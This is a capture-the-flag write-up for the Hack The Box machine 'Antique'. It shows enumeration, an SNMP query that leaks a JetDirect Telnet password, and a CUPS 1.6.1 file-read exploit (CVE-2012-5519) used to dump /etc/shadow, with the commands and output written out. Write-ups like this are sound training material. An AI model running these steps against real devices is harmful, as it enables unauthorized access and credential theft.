---
clayout: ctf
title: Antique
date: 2025-08-28
image: /ctf/hack-the-box/machines/antique/info-card.png
type: Hack The Box

ctf:
    - name: Antique
      link: https://app.hackthebox.com/machines/400
      thumbnail: /ctf/hack-the-box/machines/antique/info-card.png
      pwned:
        - link: https://labs.hackthebox.com/achievement/machine/585215/400
          thumbnail: /ctf/hack-the-box/machines/antique/pwned.png
---

## Machine Overview

The target machine runs a vulnerable HP JetDirect service exposed over Telnet (port 23) and a local CUPS printing service (port 631). Initial access is obtained through Telnet using SNMP information disclosure, and privilege escalation is achieved via a CUPS vulnerability.

## Enumeration

### Nmap Scan

We begin with a service scan to enumerate open ports:

```bash
nmap -A -oN nmap.txt 10.10.11.107
```

**Results:**

```bash
PORT   STATE SERVICE VERSION
23/tcp open  telnet?
| fingerprint-strings:
|   ... 
|     JetDirect
|     Password:
|   NULL:
|_    JetDirect
```

Port 23 is running a Telnet service that identifies as HP JetDirect.

Running a UDP scan reveals another service on port 631:

```bash
nmap -sU -p- -oN udp-nmap.txt 10.10.11.107
```

**Results:**

```bash
PORT    STATE         SERVICE
631/udp open|filtered ipp
```

This corresponds to the Internet Printing Protocol (IPP), which is typically handled by CUPS.

### Telnet Access

Connecting to the Telnet service:

```bash
telnet 10.10.11.107
Trying 10.10.11.107...
Connected to 10.10.11.107.
Escape character is '^]'.

HP JetDirect

Password:
```

At this point, we need valid credentials. Searching online, we identify that JetDirect has a known information [disclosure issue](https://www.exploit-db.com/exploits/22319). Using `snmpwalk`, we can extract sensitive data:

```bash
snmpwalk -v2c -c public 10.10.11.107 .1.3.6.1.4.1.11.2.3.9.1.1.13.0
```

**Output (truncated):**

```bash
iso.3.6.1.4.1.11.2.3.9.1.1.13.0 = BITS: 50 40 73 73 77 30 72 64 ...
```

The output is in hexadecimal/bit representation. Converting it in [CyberChef](https://cyberchef.net/#recipe=From_Hex('Auto')&input=NTAgNDAgNzMgNzMgNzcgMzAgNzIgNjQgNDAgMzEgMzIgMzMgMjEgMjEgMzEgMzIKMzMgMSAzIDkgMTcgMTggMTkgMjIgMjMgMjUgMjYgMjcgMzAgMzEgMzMgMzQgMzUgMzcgMzggMzkgNDIgNDMgNDkgNTAgNTEgNTQgNTcgNTggNjEgNjUgNzQgNzUgNzkgODIgODMgODYgOTAgOTEgOTQgOTUgOTggMTAzIDEwNiAxMTEgMTE0IDExNSAxMTkgMTIyIDEyMyAxMjYgMTMwIDEzMSAxMzQgMTM1) reveals the password:

```text
P@ssw0rd@123!!123
```

With these credentials, we authenticate via Telnet:

```bash
telnet 10.10.11.107
Password: P@ssw0rd@123!!123

Please type "?" for HELP
> exec id
uid=7(lp) gid=7(lp) groups=7(lp),19(lpadmin)
```

We have a shell running as the `lp` user.

> [!NOTE] User flag
> `/var/spool/lpd/user.txt`

## Privilege Escalation (lp → root)

Checking open connections shows that CUPS is running locally on port 631:

```bash
exec (netstat -punta || ss --ntpu)
```

**Output:**

```bash
tcp   0   0 127.0.0.1:631   0.0.0.0:*   LISTEN
tcp6  0   0 ::1:631         :::*        LISTEN
```

We query the service with `curl`:

```bash
exec curl -s http://localhost:631
```

**Output (excerpt):**

```html
<TITLE>Home - CUPS 1.6.1</TITLE>
<H1>CUPS 1.6.1</H1>
...
```

The server is running **CUPS 1.6.1**. This version is vulnerable to [CVE-2012-5519](https://github.com/p1ckzi/CVE-2012-5519). The vulnerability allows local users to read arbitrary files with root privileges.

We use a public exploit script to read sensitive files:

```bash
exec echo '/etc/shadow' | ./cups-root-file-read.sh 10.10.11.107 631
```

**Output (truncated):**

```bash
root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6bt...
daemon:*:18375:0:99999:7:::
bin:*:18375:0:99999:7:::
...
```

> [!NOTE] Root flag
> `/root/root.txt`
